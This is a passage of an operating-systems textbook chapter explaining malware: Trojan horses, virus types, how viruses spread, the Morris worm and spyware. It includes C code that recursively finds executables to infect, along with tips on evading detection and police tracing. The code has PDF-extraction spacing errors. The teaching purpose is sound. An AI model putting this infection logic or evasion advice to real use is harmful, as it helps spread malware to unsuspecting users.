Mal’s\r\nTrojan horse with superuser power and bingo. The Trojan horse could then make\r\n/home/mal/bin/sh SETUID root. All it takes is two system calls: chown to change\r\nthe owner of /home/mal/bin/sh to root and chmod to set its SETUID bit. Now Mal\r\ncan become superuser at will by just running that shell.\r\nIf Mal finds himself frequently short of cash, he might use one of the following\r\nTrojan horse scams to help his liquidity position. In the first one, the Trojan horse\r\nchecks to see if the victim has an online banking program installed. If so, the Tro\u0002jan horse directs the program to transfer some money from the victim’s account to\r\na dummy account (preferably in a far-away country) for collection in cash later.\r\nLikewise, if the Trojan runs on a mobile phone (smart or not), the Trojan horse\r\nmay also send text messages to really expensive toll numbers, preferably again in a\r\nfar-aw ay country, such as Moldova (part of the former Soviet Union)."
          },
          "9.9.2 Viruses": {
            "page": 695,
            "content": "9.9.2 Viruses\r\nIn this section we will examine viruses; after it, we turn to worms. Also, the\r\nInternet is full of information about viruses, so the genie is already out of the bot\u0002tle. In addition, it is hard for people to defend themselves against viruses if they do\r\nnot know how they work. Finally, there are a lot of misconceptions about viruses\r\nfloating around that need correction.\r\nWhat is a virus, anyway? To make a long story short, a virus is a program that\r\ncan reproduce itself by attaching its code to another program, analogous to how\nSEC. 9.9 MALWARE 665\r\nbiological viruses reproduce. The virus can also do other things in addition to\r\nreproducing itself. Worms are like viruses but are self replicating. That difference\r\nwill not concern us for the moment, so we will use the term ‘‘virus’’ to cover both.\r\nWe will look at worms in Sec. 9.9.3.\r\nHow Viruses Work\r\nLet us now see what kinds of viruses there are and how they work. The virus\r\nwriter, let us call him Virgil, probably works in assembler (or maybe C) to get a\r\nsmall, efficient product. After he has written his virus, he inserts it into a program\r\non his own machine. That infected program is then distributed, perhaps by posting\r\nit to a free software collection on the Internet. The program could be an exciting\r\nnew game, a pirated version of some commercial software, or anything else likely\r\nto be considered desirable. People then begin to download the infected program.\r\nOnce installed on the victim’s machine, the virus lies dormant until the infect\u0002ed program is executed. Once started, it usually begins by infecting other programs\r\non the machine and then executing its payload. In many cases, the payload may\r\ndo nothing until a certain date has passed to make sure that the virus is widespread\r\nbefore people begin noticing it. The date chosen might even send a political mes\u0002sage (e.g., if it triggers on the 100th or 500th anniversary of some grave insult to\r\nthe author’s ethnic group).\r\nIn the discussion below, we will examine seven kinds of viruses based on what\r\nis infected. These are companion, executable program, memory, boot sector, device\r\ndriver, macro, and source code viruses. No doubt new types will appear in the fu\u0002ture.\r\nCompanion Viruses\r\nA companion virus does not actually infect a program, but gets to run when\r\nthe program is supposed to run. They are really old, going back to the days when\r\nMS-DOS ruled the earth but they still exist. The concept is easiest to explain with\r\nan example. In MS-DOS when a user types\r\nprog\r\nMS-DOS first looks for a program named prog.com. If it cannot find one, it looks\r\nfor a program named prog.exe. In Windows, when the user clicks on Start and then\r\nRun (or presses the Windows key and then ‘‘R’’), the same thing happens. Now\u0002adays, most programs are .exe files; .com files are very rare.\r\nSuppose that Virgil knows that many people run prog.exe from an MS-DOS\r\nprompt or from Run on Windows. He can then simply release a virus called\r\nprog.com, which will get executed when anyone tries to run prog (unless he ac\u0002tually types the full name: prog.exe). When prog.com has finished its work, it then\r\njust executes prog.exe and the user is none the wiser.\n666 SECURITY CHAP. 9\r\nA somewhat related attack uses the Windows desktop, which contains short\u0002cuts (symbolic links) to programs. A virus can change the target of a shortcut to\r\nmake it point to the virus. When the user double clicks on an icon, the virus is ex\u0002ecuted. When it is done, the virus just runs the original target program.\r\nExecutable Program Viruses\r\nOne step up in complexity are viruses that infect executable programs. The\r\nsimplest of this type just overwrites the executable program with itself. These are\r\ncalled overwriting viruses. The infection logic of such a virus is given in\r\nFig. 9-28.\r\n#include <sys/types.h> /* standard POSIX headers */\r\n#include <sys/stat.h>\r\n#include <dirent.h>\r\n#include <fcntl.h>\r\n#include <unistd.h>\r\nstr uct stat sbuf; /* for lstat call to see if file is sym link */\r\nsearch(char *dir name)\r\n{ /* recursively search for executables */\r\nDIR *dir p; /* pointer to an open directory stream */\r\nstr uct dirent *dp; /* pointer to a directory entr y */\r\ndir p = opendir(dir name); /* open this directory */\r\nif (dirp == NULL) return; /* dir could not be opened; forget it */\r\nwhile (TRUE) {\r\ndp = readdir(dirp); /* read next directory entr y */\r\nif (dp == NULL) { /* NULL means we are done */\r\nchdir (\"..\"); /* go back to parent directory */\r\nbreak; /* exit loop */\r\n}\r\nif (dp->d name[0] == ’.’) continue; /* skip the . and .. directories */\r\nlstat(dp->d name, &sbuf); /* is entry a symbolic link? */\r\nif (S ISLNK(sbuf.st mode)) continue; /* skip symbolic links */\r\nif (chdir(dp->d name) == 0) { /* if chdir succeeds, it must be a dir */\r\nsearch(\".\"); /* yes, enter and search it */\r\n} else { /* no (file), infect it */\r\nif (access(dp->d name,X OK) == 0) /* if executable, infect it */\r\ninfect(dp->d name);\r\n}\r\nclosedir(dir p); /* dir processed; close and return */\r\n}\r\nFigure 9-28. A recursive procedure that finds executable files on a UNIX system.\r\nThe main program of this virus would first copy its binary program into an\r\narray by opening argv[0] and reading it in for safekeeping. Then it would traverse\nSEC. 9.9 MALWARE 667\r\nthe entire file system starting at the root directory by changing to the root directory\r\nand calling search with the root directory as parameter.\r\nThe recursive procedure search processes a directory by opening it, then read\u0002ing the entries one at a time using readdir until a NULL is returned, indicating that\r\nthere are no more entries. If the entry is a directory, it is processed by changing to\r\nit and then calling search recursively; if it is an executable file, it is infected by cal\u0002ling infect with the name of the file to infect as parameter. Files starting with ‘‘.’’\r\nare skipped to avoid problems with the . and .. directories. Also, symbolic links are\r\nskipped because the program assumes that it can enter a directory using the chdir\r\nsystem call and then get back to where it was by going to .. , something that holds\r\nfor hard links but not symbolic links. A fancier program could handle symbolic\r\nlinks, too.\r\nThe actual infection procedure, infect (not shown), merely has to open the file\r\nnamed in its parameter, copy the virus saved in the array over the file, and then\r\nclose the file.\r\nThis virus could be ‘‘improved’’ in various ways. First, a test could be inserted\r\ninto infect to generate a random number and just return in most cases without\r\ndoing anything. In, say, one call out of 128, infection would take place, thereby\r\nreducing the chances of early detection, before the virus has had a good chance to\r\nspread. Biological viruses have the same property: those that kill their victims\r\nquickly do not spread nearly as fast as those that produce a slow, lingering death,\r\ngiving the victims plenty of chance to spread the virus. An alternative design\r\nwould be to have a higher infection rate (say, 25%) but a cutoff on the number of\r\nfiles infected at once to reduce disk activity and thus be less conspicuous.\r\nSecond, infect could check to see if the file is already infected. Infecting the\r\nsame file twice just wastes time. Third, measures could be taken to keep the time\r\nof last modification and file size the same as it was to help hide the infection. For\r\nprograms larger than the virus, the size will remain unchanged, but for programs\r\nsmaller than the virus, the program will now be bigger. Since most viruses are\r\nsmaller than most programs, this is not a serious problem.\r\nAlthough this program is not very long (the full program is under one page of\r\nC and the text segment compiles to under 2 KB), an assembly-code version of it\r\ncan be even shorter. Ludwig (1998) gives an assembly-code program for MS-DOS\r\nthat infects all the files in its directory and is only 44 bytes when assembled.\r\nLater in this chapter we will study antivirus programs, that is, programs that\r\ntrack down and remove viruses. It is interesting to note here that the logic of\r\nFig. 9-28, which a virus could use to find all the executable files to infect them,\r\ncould also be used by an antivirus program to track down all the infected programs\r\nin order to remove the virus. The technologies of infection and disinfection go\r\nhand in hand, which is why it is necessary to understand in detail how viruses work\r\nin order to be able to fight them effectively.\r\nFrom Virgil’s point of view, the problem with an overwriting virus is that it is\r\ntoo easy to detect. After all, when an infected program executes, it may spread the\n668 SECURITY CHAP. 9\r\nvirus some more, but it does not do what it is supposed to do, and the user will no\u0002tice this instantly. Consequently, many viruses attach themselves to the program\r\nand do their dirty work, but allow the program to function normally afterward.\r\nSuch viruses are called parasitic viruses.\r\nParasitic viruses can attach themselves to the front, the back, or the middle of\r\nthe executable program. If a virus attaches itself to the front, it has to first copy the\r\nprogram to RAM, put itself on the front, and then copy the program back from\r\nRAM following itself, as shown in Fig. 9-29(b). Unfortunately, the program will\r\nnot run at its new virtual address, so the virus has to either relocate the program as\r\nit is moved or move it to virtual address 0 after finishing its own execution.\r\n(a)\r\nExecutable\r\nprogram\r\nHeader\r\n(b)\r\nExecutable\r\nprogram\r\nHeader\r\nVirus\r\n(c)\r\nExecutable\r\nprogram\r\nHeader\r\n(d)\r\nHeader\r\nVirus\r\nVirus\r\nVirus\r\nVirus\r\nVirus\r\nStarting\r\naddress\r\nFigure 9-29. (a) An executable program. (b) With a virus at the front. (c) With a\r\nvirus at the end. (d) With a virus spread over free space within the program.\r\nTo avoid either of the complex options required by these front loaders, most vi\u0002ruses are back loaders, attaching themselves to the end of the executable program\r\ninstead of the front, changing the starting address field in the header to point to the\r\nstart of the virus, as illustrated in Fig. 9-29(c). The virus will now execute at a dif\u0002ferent virtual address depending on which infected program is running, but all this\r\nmeans is that Virgil has to make sure his virus is position independent, using rela\u0002tive instead of absolute addresses. That is not hard for an experienced programmer\r\nto do and some compilers can do it upon request.\r\nComplex executable program formats, such as .exe files on Windows and\r\nnearly all modern UNIX binary formats, allow a program to have multiple text and\r\ndata segments, with the loader assembling them in memory and doing relocation\r\non the fly. In some systems (Windows, for example), all segments (sections) are\r\nmultiples of 512 bytes. If a segment is not full, the linker fills it out with 0s. A\r\nvirus that understands this can try to hide itself in the holes. If it fits entirely, as in\r\nFig. 9-29(d), the file size remains the same as that of the uninfected file, clearly a\r\nplus, since a hidden virus is a happy virus. Viruses that use this principle are called\r\ncavity viruses. Of course, if the loader does not load the cavity areas into memo\u0002ry, the virus will need another way of getting started.\nSEC. 9.9 MALWARE 669\r\nMemory-Resident Viruses\r\nSo far we have assumed that when an infected program is executed, the virus\r\nruns, passes control to the real program, and then exits. In contrast, a memory\u0002resident virus stays in memory (RAM) all the time, either hiding at the very top of\r\nmemory or perhaps down in the grass among the interrupt vectors, the last few\r\nhundred bytes of which are generally unused. A very smart virus can even modify\r\nthe operating system’s RAM bitmap to make the system think the virus’ memory is\r\noccupied, to avoid the embarrassment of being overwritten.\r\nA typical memory-resident virus captures one of the trap or interrupt vectors\r\nby copying the contents to a scratch variable and putting its own address there, thus\r\ndirecting that trap or interrupt to it. The best choice is the system call trap. In that\r\nway, the virus gets to run (in kernel mode) on every system call. When it is done, it\r\njust invokes the real system call by jumping to the saved trap address.\r\nWhy would a virus want to run on every system call? To infect programs, nat\u0002urally. The virus can just wait until an exec system call comes along, and then,\r\nknowing that the file at hand is an executable binary (and probably a useful one at\r\nthat), infect it. This process does not require the massive disk activity of Fig. 9-28,\r\nso it is far less conspicuous. Catching all system calls also gives the virus great po\u0002tential for spying on data and performing all manner of mischief.\r\nBoot Sector Viruses\r\nAs we discussed in Chap. 5, when most computers are turned on, the BIOS\r\nreads the master boot record from the start of the boot disk into RAM and executes\r\nit. This program determines which partition is active and reads in the first sector,\r\nthe boot sector, from that partition and executes it. That program then either loads\r\nthe operating system or brings in a loader to load the operating system. Unfortun\u0002ately, many years ago one of Virgil’s friends got the idea of creating a virus that\r\ncould overwrite the master boot record or the boot sector, with devastating results.\r\nSuch viruses, called boot sector viruses, are still very common.\r\nNormally, a boot sector virus [which includes MBR (Master Boot Record) vi\u0002ruses] first copies the true boot sector to a safe place on the disk so that it can boot\r\nthe operating system when it is finished. The Microsoft disk formatting program,\r\nfdisk, skips the first track, so that is a good hiding place on Windows machines.\r\nAnother option is to use any free disk sector and then update the bad-sector list to\r\nmark the hideout as defective. In fact, if the virus is large, it can also disguise the\r\nrest of itself as bad sectors. A really aggressive virus could even just allocate nor\u0002mal disk space for the true boot sector and itself, and update the disk’s bitmap or\r\nfree list accordingly. Doing this requires an intimate knowledge of the operating\r\nsystem’s internal data structures, but Virgil had a good professor for his operating\r\nsystems course and studied hard.\n670 SECURITY CHAP. 9\r\nWhen the computer is booted, the virus copies itself to RAM, either at the top\r\nor down among the unused interrupt vectors. At this point the machine is in kernel\r\nmode, with the MMU off, no operating system, and no antivirus program running.\r\nParty time for viruses. When it is ready, it boots the operating system, usually\r\nstaying memory resident so it can keep an eye on things.\r\nOne problem, however, is how to get control again later. The usual way is to\r\nexploit specific knowledge of how the operating system manages the interrupt vec\u0002tors. For example, Windows does not overwrite all the interrupt vectors in one\r\nblow. Instead, it loads device drivers one at a time, and each one captures the inter\u0002rupt vector it needs. This process can take a minute.\r\nThis design gives the virus the handle it needs to get going. It starts out by\r\ncapturing all the interrupt vectors, as shown in Fig. 9-30(a). As drivers load, some\r\nof the vectors are overwritten, but unless the clock driver is loaded first, there will\r\nbe plenty of clock interrupts later that start the virus. Loss of the printer interrupt is\r\nshown in Fig. 9-30(b). As soon as the virus sees that one of its interrupt vectors\r\nhas been overwritten, it can overwrite that vector again, knowing that it is now safe\r\n(actually, some interrupt vectors are overwritten several times during booting, but\r\nthe pattern is deterministic and Virgil knows it by heart). Recapture of the printer\r\nis shown in Fig. 9-30(c). When ev erything is loaded, the virus restores all the in\u0002terrupt vectors and keeps only the system-call trap vector for itself. At this point\r\nwe have a memory-resident virus in control of system calls. In fact, this is how\r\nmost memory-resident viruses get started in life.\r\nOperating\r\nsystem\r\nVirus\r\nSys call traps\r\nDisk vector\r\nClock vector\r\nPrinter vector\r\n(a)\r\nOperating\r\nsystem\r\nVirus\r\nSys call traps\r\nDisk vector\r\nClock vector\r\nPrinter vector\r\n(b)\r\nOperating\r\nsystem\r\nVirus\r\nSys call traps\r\nDisk vector\r\nClock vector\r\nPrinter vector\r\n(c)\r\nFigure 9-30. (a) After the virus has captured all the interrupt and trap vectors.\r\n(b) After the operating system has retaken the printer interrupt vector. (c) After\r\nthe virus has noticed the loss of the printer interrupt vector and recaptured it.\nSEC. 9.9 MALWARE 671\r\nDevice Driver Viruses\r\nGetting into memory like this is a little like spelunking (exploring caves)—you\r\nhave to go through contortions and keep worrying about something falling down\r\nand landing on your head. It would be much simpler if the operating system would\r\njust kindly load the virus officially. With a little bit of work, that goal can be\r\nachieved right off the bat. The trick is to infect a device driver, leading to a device\r\ndriver virus. In Windows and some UNIX systems, device drivers are just ex\u0002ecutable programs that live on the disk and are loaded at boot time. If one of them\r\ncan be infected, the virus will always be officially loaded at boot time. Even nicer,\r\ndrivers run in kernel mode, and after a driver is loaded, it is called, giving the virus\r\na chance to capture the system-call trap vector. This fact alone is actually a strong\r\nargument for running the device drivers as user-mode programs (as MINIX 3\r\ndoes)—because if they get infected, they cannot do nearly as much damage as ker\u0002nel-mode drivers.\r\nMacro Viruses\r\nMany programs, such as Word and Excel, allow users to write macros to group\r\nseveral commands that can later be executed with a single keystroke. Macros can\r\nalso be attached to menu items, so that when one of them is selected, the macro is\r\nexecuted. In Microsoft Office, macros can contain entire programs in Visual Basic,\r\nwhich is a complete programming language. The macros are interpreted rather than\r\ncompiled, but that affects only execution speed, not what they can do. Since\r\nmacros may be document specific, Office stores the macros for each document\r\nalong with the document.\r\nNow comes the problem. Virgil writes a document in Word and creates a macro\r\nthat he attaches to the OPEN FILE function. The macro contains a macro virus.\r\nHe then emails the document to the victim, who naturally opens it (assuming the\r\nemail program has not already done this for him). Opening the document causes\r\nthe OPEN FILE macro to execute. Since the macro can contain an arbitrary pro\u0002gram, it can do anything, such as infect other Word documents, erase files, and\r\nmore. In all fairness to Microsoft, Word does give a warning when opening a file\r\nwith macros, but most users do not understand what this means and continue open\u0002ing anyway. Besides, legitimate documents may also contain macros. And there\r\nare other programs that do not even giv e this warning, making it even harder to\r\ndetect a virus.\r\nWith the growth of email attachments, sending documents with viruses embed\u0002ded in macros is easy. Such viruses are much easier to write than concealing the\r\ntrue boot sector somewhere in the bad-block list, hiding the virus among the inter\u0002rupt vectors, and capturing the system-call trap vector. This means that increasing\u0002ly less skilled people can now write viruses, lowering the general quality of the\r\nproduct and giving virus writers a bad name.\n672 SECURITY CHAP. 9\r\nSource Code Viruses\r\nParasitic and boot sector viruses are highly platform specific; document viruses\r\nare somewhat less so (Word runs on Windows and Macs, but not on UNIX). The\r\nmost portable viruses of all are source code viruses. Imagine the virus of\r\nFig. 9-28, but with the modification that instead of looking for binary executable\r\nfiles, it looks for C programs, a change of only 1 line (the call to access). The\r\ninfect procedure should be changed to insert the line\r\n#include <virus.h>\r\nat the top of each C source program. One other insertion is needed, the line\r\nrun vir us( );\r\nto activate the virus. Deciding where to put this line requires some ability to parse\r\nC code, since it must be at a place that syntactically allows procedure calls and also\r\nnot at a place where the code would be dead (e.g., following a retur n statement).\r\nPutting it in the middle of a comment does not work either, and putting it inside a\r\nloop might be too much of a good thing. Assuming the call can be placed properly\r\n(e.g., just before the end of main or before the retur n statement if there is one),\r\nwhen the program is compiled, it now contains the virus, taken from virus.h (al\u0002though proj.h might attract less attention should somebody see it).\r\nWhen the program runs, the virus will be called. The virus can do anything it\r\nwants to, for example, look for other C programs to infect. If it finds one, it can in\u0002clude just the two lines given above, but this will work only on the local machine,\r\nwhere virus.h is assumed to be installed already. To hav e this work on a remote\r\nmachine, the full source code of the virus must be included. This can be done by\r\nincluding the source code of the virus as an initialized character string, preferably\r\nas a list of 32-bit hexadecimal integers to prevent anyone from figuring out what it\r\ndoes. This string will probably be fairly long, but with today’s multimegaline code,\r\nit might easily slip by.\r\nTo the uninitiated reader, all of these ways may look fairly complicated. One\r\ncan legitimately wonder if they could be made to work in practice. They can be.\r\nBelieve us. Virgil is an excellent programmer and has a lot of free time on his\r\nhands. Check your local newspaper for proof.\r\nHow Viruses Spread\r\nThere are several scenarios for distribution. Let us start with the classical one.\r\nVirgil writes his virus, inserts it into some program he has written (or stolen), and\r\nstarts distributing the program, for example, by putting it on a shareware Website.\r\nEventually, somebody downloads the program and runs it. At this point there are\r\nseveral options. To start with, the virus probably infects more files on the disk, just\r\nin case the victim decides to share some of these with a friend later. It can also try\nSEC. 9.9 MALWARE 673\r\nto infect the boot sector of the hard disk. Once the boot sector is infected, it is easy\r\nto start a kernel-mode memory-resident virus on subsequent boots.\r\nNowadays, other options are also available to Virgil. The virus can be written\r\nto check if the infected machine is on a (wireless) LAN, something that is very\r\nlikely. The virus can then start infecting unprotected files on all the machines con\u0002nected to the LAN. This infection will not extend to protected files, but that can be\r\ndealt with by making infected programs act strangely. A user who runs such a pro\u0002gram will likely ask the system administrator for help. The administrator will then\r\ntry out the strange program himself to see what is going on. If the administrator\r\ndoes this while logged in as superuser, the virus can now infect the system binaries,\r\ndevice drivers, operating system, and boot sectors. All it takes is one mistake like\r\nthis and all the machines on the LAN are compromised.\r\nMachines on a company LAN often have authorization to log onto remote ma\u0002chines over the Internet or a private network, or even authorization to execute com\u0002mands remotely without logging in. This ability provides more opportunity for vi\u0002ruses to spread. Thus one innocent mistake can infect the entire company. To pre\u0002vent this scenario, all companies should have a general policy telling administra\u0002tors never to make mistakes.\r\nAnother way to spread a virus is to post an infected program to a USENET\r\n(i.e., Google) newsgroup or Website to which programs are regularly posted. Also\r\npossible is to create a Web page that requires a special browser plug-in to view, and\r\nthen make sure the plug-ins are infected.\r\nA different attack is to infect a document and then email it to many people or\r\nbroadcast it to a mailing list or USENET newsgroup, usually as an attachment.\r\nEven people who would never dream of running a program some stranger sent\r\nthem might not realize that clicking on the attachment to open it can release a virus\r\non their machine. To make matters worse, the virus can then look for the user’s ad\u0002dress book and then mail itself to everyone in the address book, usually with a\r\nSubject line that looks legitimate or interesting, like\r\nSubject: Change of plans\r\nSubject: Re: that last email\r\nSubject: The dog died last night\r\nSubject: I am seriously ill\r\nSubject: I love you\r\nWhen the email arrives, the receiver sees that the sender is a friend or colleague,\r\nand thus does not suspect trouble. Once the email has been opened, it is too late.\r\nThe ‘‘I LOVE YOU’’ virus that spread around the world in June 2000 worked this\r\nway and did a billion dollars worth of damage.\r\nSomewhat related to the actual spreading of active viruses is the spreading of\r\nvirus technology. There are groups of virus writers who actively communicate over\r\nthe Internet and help each other develop new technology, tools, and viruses. Most\r\nof them are probably hobbyists rather than career criminals, but the effects can be\n674 SECURITY CHAP. 9\r\njust as devastating. Another category of virus writers is the military, which sees vi\u0002ruses as a weapon of war potentially able to disable an enemy’s computers.\r\nAnother issue related to spreading viruses is avoiding detection. Jails have\r\nnotoriously bad computing facilities, so Virgil would prefer avoiding them. Post\u0002ing a virus from his home machine is not a wise idea. If the attack is successful,\r\nthe police might track him down by looking for the virus message with the\r\nyoungest timestamp, since that is probably closest to the source of the attack.\r\nTo minimize his exposure, Virgil might go to an Internet cafe in a distant city\r\nand log in there. He can either bring the virus on a USB stick and read it in him\u0002self, or if the machines do not have USB ports, ask the nice young lady at the desk\r\nto please read in the file book.doc so he can print it. Once it is on his hard disk, he\r\nrenames the file virus.exe and executes it, infecting the entire LAN with a virus\r\nthat triggers a month later, just in case the police decide to ask the airlines for a list\r\nof all people who flew in that week.\r\nAn alternative is to forget the USB stick and fetch the virus from a remote Web\r\nor FTP site. Or bring a notebook and plug it in to an Ethernet port that the Internet\r\ncafe has thoughtfully provided for notebook-toting tourists who want to read their\r\nemail every day. Once connected to the LAN, Virgil can set out to infect all of the\r\nmachines on it.\r\nThere is a lot more to be said about viruses. In particular how they try to hide\r\nand how antivirus software tries to flush them out. They can even hide inside live\r\nanimals—really—see Rieback et al. (2006). We will come back to these topics\r\nwhen we get into defenses against malware later in this chapter."
          },
          "9.9.3 Worms": {
            "page": 705,
            "content": "9.9.3 Worms\r\nThe first large-scale Internet computer security violation began in the evening\r\nof Nov. 2, 1988, when a Cornell graduate student, Robert Tappan Morris, released\r\na worm program into the Internet. This action brought down thousands of com\u0002puters at universities, corporations, and government laboratories all over the world\r\nbefore it was tracked down and removed. It also started a controversy that has not\r\nyet died down. We will discuss the highlights of this event below. For more techni\u0002cal information see the paper by Spafford et al. (1989). For the story viewed as a\r\npolice thriller, see the book by Hafner and Markoff (1991).\r\nThe story began sometime in 1988, when Morris discovered two bugs in\r\nBerkeley UNIX that made it possible to gain unauthorized access to machines all\r\nover the Internet. As we shall see, one of them was a buffer overflow. Working all\r\nalone, he wrote a self-replicating program, called a worm, that would exploit these\r\nerrors and replicate itself in seconds on every machine it could gain access to. He\r\nworked on the program for months, carefully tuning it and having it try to hide its\r\ntracks.\r\nIt is not known whether the release on Nov. 2, 1988, was intended as a test, or\r\nwas the real thing. In any event, it did bring most of the Sun and VAX systems on\nSEC. 9.9 MALWARE 675\r\nthe Internet to their knees within a few hours of its release. Morris’ motivation is\r\nunknown, but it is possible that he intended the whole idea as a high-tech practical\r\njoke, but which due to a programming error got completely out of hand.\r\nTechnically, the worm consisted of two programs, the bootstrap and the worm\r\nproper. The bootstrap was 99 lines of C called l1.c. It was compiled and executed\r\non the system under attack. Once running, it connected to the machine from which\r\nit came, uploaded the main worm, and executed it. After going to some trouble to\r\nhide its existence, the worm then looked through its new host’s routing tables to\r\nsee what machines that host was connected to and attempted to spread the boot\u0002strap to those machines.\r\nThree methods were tried to infect new machines. Method 1 was to try to run a\r\nremote shell using the rsh command. Some machines trust other machines, and just\r\nrun rsh without any further authentication. If this worked, the remote shell upload\u0002ed the worm program and continued infecting new machines from there.\r\nMethod 2 made use of a program present on all UNIX systems called finger\r\nthat allows a user anywhere on the Internet to type\r\nfinger name@site\r\nto display information about a person at a particular installation. This information\r\nusually includes the person’s real name, login, home and work addresses and tele\u0002phone numbers, secretary’s name and telephone number, FAX number, and similar\r\ninformation. It is the electronic equivalent of the phone book.\r\nFinger works as follows. On ev ery UNIX machine a background process call\u0002ed the finger daemon, runs all the time fielding and answering queries from all\r\nover the Internet. What the worm did was call finger with a specially handcrafted\r\n536-byte string as parameter. This long string overflowed the daemon’s buffer and\r\noverwrote its stack, the way shown in Fig. 9-21(c). The bug exploited here was the\r\ndaemon’s failure to check for overflow. When the daemon returned from the proce\u0002dure it was in at the time it got the request, it returned not to main, but to a proce\u0002dure inside the 536-byte string on the stack. This procedure tried to execute sh. If\r\nit worked, the worm now had a shell running on the machine under attack.\r\nMethod 3 depended on a bug in the mail system, sendmail, which allowed the\r\nworm to mail a copy of the bootstrap and get it executed.\r\nOnce established, the worm tried to break user passwords. Morris did not have\r\nto do much research on how to accomplish this. All he had to do was ask his\r\nfather, a security expert at the National Security Agency, the U.S. government’s\r\ncode-breaking agency, for a reprint of a classic paper on the subject that Morris Sr.\r\nand Ken Thompson had written a decade earlier at Bell Labs (Morris and Thomp\u0002son, 1979). Each broken password allowed the worm to log in on any machines\r\nthe password’s owner had accounts on.\r\nEvery time the worm gained access to a new machine, it first checked to see if\r\nany other copies of the worm were already active there. If so, the new copy exited,\r\nexcept one time in seven it kept going, possibly in an attempt to keep the worm\n676 SECURITY CHAP. 9\r\npropagating even if the system administrator there started up his own version of the\r\nworm to fool the real worm. The use of one in seven created far too many worms,\r\nand was the reason all the infected machines ground to a halt: they were infested\r\nwith worms. If Morris had left this out and just exited whenever another worm\r\nwas sighted (or made it one in 50) the worm would probably have gone undetected.\r\nMorris was caught when one of his friends spoke with the New York Times sci\u0002ence reporter, John Markoff, and tried to convince Markoff that the incident was an\r\naccident, the worm was harmless, and the author was sorry. The friend inadver\u0002tently let slip that the perpetrator’s login was rtm. Converting rtm into the owner’s\r\nname was easy—all that Markoff had to do was to run finger. The next day the\r\nstory was the lead on page one, even upstaging the presidential election three days\r\nlater.\r\nMorris was tried and convicted in federal court. He was sentenced to a fine of\r\n$10,000, 3 years probation, and 400 hours of community service. His legal costs\r\nprobably exceeded $150,000. This sentence generated a great deal of controversy.\r\nMany in the computer community felt that he was a bright graduate student whose\r\nharmless prank had gotten out of control. Nothing in the worm suggested that Mor\u0002ris was trying to steal or damage anything. Others felt he was a serious criminal\r\nand should have gone to jail. Morris later got his Ph.D. from Harvard and is now a\r\nprofessor at M.I.T.\r\nOne permanent effect of this incident was the establishment of CERT\r\n(the Computer Emergency Response Team), which provides a central place to\r\nreport break-in attempts, and a group of experts to analyze security problems and\r\ndesign fixes. While this action was certainly a step forward, it also has its down\u0002side. CERT collects information about system flaws that can be attacked and how\r\nto fix them. Of necessity, it circulates this information widely to thousands of sys\u0002tem administrators on the Internet. Unfortunately, the bad guys (possibly posing as\r\nsystem administrators) may also be able to get bug reports and exploit the loop\u0002holes in the hours (or even days) before they are closed.\r\nA variety of other worms have been released since the Morris worm. They op\u0002erate along the same lines as the Morris worm, only exploiting different bugs in\r\nother software. They tend to spread much faster than viruses because they move on\r\ntheir own."
          },
          "9.9.4 Spyware": {
            "page": 707,
            "content": "9.9.4 Spyware\r\nAn increasingly common kind of malware is spyware, Roughly speaking, spy\u0002ware is software that is surrepitiously loaded onto a PC without the owner’s know\u0002ledge and runs in the background doing things behind the owner’s back. Defining\r\nit, though, is surprisingly tricky. For example, Windows Update automatically\r\ndownloads security patches to Windows without the owners being aware of it. Sim\u0002ilarly, many antivirus programs automatically update themselves silently in the\nSEC. 9.9 MALWARE 677\r\nbackground. Neither of these are considered spyware. If Potter Stewart were alive,\r\nhe would probably say: ‘‘I can’t define spyware, but I know it when I see it.’’†\r\nOthers have tried harder to define it (spyware, not pornography). Barwinski et\r\nal. (2006) have said it has four characteristics. First, it hides, so the victim cannot\r\nfind it easily. Second, it collects data about the user (Websites visited, passwords,\r\nev en credit card numbers). Third, it communicates the collected information back\r\nto its distant master. And fourth, it tries to survive determined attempts to remove\r\nit. Additionally, some spyware changes settings and performs other malicious and\r\nannoying activities as described below.\r\nBarwinsky et al. divided the spyware into three broad categories. The first is\r\nmarketing: the spyware simply collects information and sends it back to the master,\r\nusually to better target advertising to specific machines. The second category is\r\nsurveillance, where companies intentionally put spyware on employee machines to\r\nkeep track of what they are doing and which Websites they are visiting. The third\r\ngets close to classical malware, where the infected machine becomes part of a\r\nzombie army waiting for its master to give it marching orders.\r\nThey ran an experiment to see what kinds of Websites contain spyware by vis\u0002iting 5000 Websites. They observed that the major purveyors of spyware are Web\u0002sites relating to adult entertainment, warez, online travel, and real estate.\r\nA much larger study was done at the University of Washington (Moshchuk et\r\nal., 2006). In the UW study, some 18 million URLs were inspected and almost 6%\r\nwere found to contain spyware. Thus it is not surprising that in a study by\r\nAOL/NCSA that they cite, 80% of the home computers inspected were infested by\r\nspyware, with an average of 93 pieces of spyware per computer. The UW study\r\nfound that the adult, celebrity, and wallpaper sites had the largest infection rates,\r\nbut they did not examine travel and real estate.\r\nHow Spyware Spreads\r\nThe obvious next question is: ‘‘How does a computer get infected with spy\u0002ware?’’ One way is the same as with any malware: via a Trojan horse. A consid\u0002erable amount of free software contains spyware, with the author of the software\r\nmaking money from the spyware. Peer-to-peer file-sharing software (e.g., Kazaa)\r\nis rampant with spyware. Also, many Websites display banner ads that direct\r\nsurfers to spyware-infested Web pages.\r\nThe other major infection route is often called the drive-by download. It is\r\npossible to pick up spyware (in fact, any malware) just by visiting an infected Web\r\npage. There are three variants of the infection technology. First, the Web page may\r\nredirect the browser to an executable (.exe) file. When the browser sees the file, it\r\npops up a dialog box asking the user if he wants to run or save the program. Since\r\nlegitimate downloads use the same mechanism, most users just click on RUN,\r\n† Stewart was a justice on the U.S. Supreme Court who once wrote an opinion on a pornography case\r\nin which he admitted to being unable to define pornography but added: ‘‘but I know it when I see it.’’\n678 SECURITY CHAP. 9\r\nwhich causes the browser to download and execute the software. At this point, the\r\nmachine is infected and the spyware is free to do anything it wants to.\r\nThe second common route is the infected toolbar. Both Internet Explorer and\r\nFirefox support third-party toolbars. Some spyware writers create a nice toolbar\r\nthat has some useful features and then widely advertise it as a great free add-on.\r\nPeople who install the toolbar get the spyware. The popular Alexa toolbar contains\r\nspyware, for example. In essence, this scheme is a Trojan horse, just packaged dif\u0002ferently.\r\nThe third infection variant is more devious. Many Web pages use a Microsoft\r\ntechnology called activeX controls. These controls are x86 binary programs that\r\nplug into Internet Explorer and extend its functionality, for example, rendering spe\u0002cial kinds of image, audio, or video Web pages. In principle, this technology is\r\nlegitimate. In practice, it is dangerous. This approach always targets IE (Internet\r\nExplorer), never Firefox, Chrome, Safari, or other browsers.\r\nWhen a page with an activeX control is visited, what happens depends on the\r\nIE security settings. If they are set 